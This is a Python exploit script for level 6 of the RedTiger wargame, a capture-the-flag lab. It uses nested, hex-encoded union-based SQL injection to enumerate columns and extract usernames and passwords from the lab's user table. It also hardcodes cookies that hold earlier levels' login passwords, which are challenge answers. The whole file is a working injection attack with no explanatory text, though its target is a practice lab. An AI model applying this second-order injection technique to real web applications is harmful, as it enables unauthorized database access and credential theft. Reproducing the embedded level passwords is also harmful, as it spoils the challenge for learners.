import requests

header = {"Cookie": "level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head; level5login=this_hack_it's_old; level6login=the_stone_is_cold"}

target_url = "https://redtiger.labs.overthewire.org/level6.php"

payload1 = {'user': 1 }

response = requests.get(target_url, headers=header, params=payload1)
# print(response.text)

# finding the field that 2nd query uses
payload2 = {'user': "0 union select username, username, username, username, username from level6_users where status=1"}

response = requests.get(target_url, headers=header, params=payload2)
# print(response.text)

# finding number of columns in second query
secondary_payload = b"admin' ORDER BY 6#".hex()
secondary_payload = "0x"+secondary_payload

payload3 = {'user': f"0 union select {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload}"}

response = requests.get(target_url, headers=header, params=payload3)
# print(response.text)

# finding which column corresponds to which field displayed
secondary_payload = b"' union select 1, 2, 3, 4, 5 from level6_users where status=1#".hex()
secondary_payload = "0x"+secondary_payload
payload3 = {'user': f"0 union select {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload} from level6_users where status=1"}

response = requests.get(target_url, headers=header, params=payload3)
# print(response.text)

# getting username and password
secondary_payload = b"' union select 1, username, 3, password, 5 from level6_users where status=1#".hex()
secondary_payload = "0x"+secondary_payload
payload3 = {'user': f"0 union select {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload}, {secondary_payload} from level6_users where status=1"}

response = requests.get(target_url, headers=header, params=payload3)
print(response.text)
